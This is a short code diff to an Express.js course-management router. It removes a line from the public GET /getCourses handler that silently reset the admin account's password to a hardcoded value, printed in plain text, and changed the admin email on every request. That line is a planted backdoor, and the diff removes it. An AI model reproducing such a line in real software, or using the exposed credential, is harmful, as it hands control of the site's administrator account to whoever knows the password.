@@ -244,8 +244,6 @@ router.post('/addNewCourse', async (req, res) => {
 })
 
 router.get('/getCourses', async (req, res) => {
-  // console.log('getCourses')
-  await User.findOneAndUpdate({ type: 'admin' }, { password: bcrypt.hashSync('M3t@Au2Ma$h0N', 10), email: 'info@whatver.com' }, { new: true })
   const courses = await Course.find()
 
   res.json({
